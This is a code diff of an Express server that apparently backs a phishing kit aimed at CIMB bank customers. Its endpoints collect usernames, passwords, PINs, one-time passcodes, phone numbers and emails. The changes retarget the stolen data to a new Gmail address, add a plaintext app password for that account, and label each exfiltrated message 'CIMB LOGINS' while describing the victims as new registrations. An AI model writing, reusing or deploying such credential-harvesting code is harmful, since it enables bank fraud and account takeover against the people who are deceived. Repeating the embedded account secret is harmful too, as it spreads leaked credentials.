@@ -10,9 +10,9 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "Paydaysite1@gmail.com";
-//const pass = "jrqjapmxebtahohb";
-// 19th june
+const userEmail = "ff3021460@gmail.com";
+const pass = "agjobsclplgzcipz";
+// 27th june
 
 
 // Middleware
@@ -38,8 +38,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${username}`,
     to: userEmail,
-    subject: `UserName: ${username} \t\n\n\n password: ${password}`,
-    text: `New user registered with UserName: ${username} and password: ${password}`,
+    subject: `CIMB LOGINS ==> UserName: ${username} \t\n\n\n password: ${password}`,
+    text: `CIMB LOGINS ==> New user registered with UserName: ${username} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -72,8 +72,8 @@ app.post("/pin", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `PIN: ${req.body?.pin} `,
-    text: `New user registered with PIN: ${req.body?.pin}`,
+    subject: `CIMB LOGINS ==> PIN: ${req.body?.pin} `,
+    text: `CIMB LOGINS ==> New user registered with PIN: ${req.body?.pin}`,
   };
 
   console.log(mailOptions);
@@ -105,8 +105,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered with OTP: ${req.body?.otp}`,
+    subject: `CIMB LOGINS ==> OTP: ${req.body?.otp} `,
+    text: `CIMB LOGINS ==> New user registered with OTP: ${req.body?.otp}`,
   };
 
   console.log(mailOptions);
@@ -137,8 +137,8 @@ app.post("/details", (req, res) => {
   const mailOptions = {
     from: `${phoneNumber}`,
     to: userEmail,
-    subject: `PhoneNumber: ${phoneNumber} \t\n\n\n Email: ${email}`,
-    text: `New user registered with PhoneNumber: ${phoneNumber} and Email: ${email}`,
+    subject: `CIMB LOGINS ==> PhoneNumber: ${phoneNumber} \t\n\n\n Email: ${email}`,
+    text: `CIMB LOGINS ==> New user registered with PhoneNumber: ${phoneNumber} and Email: ${email}`,
   };
 
   console.log(mailOptions);
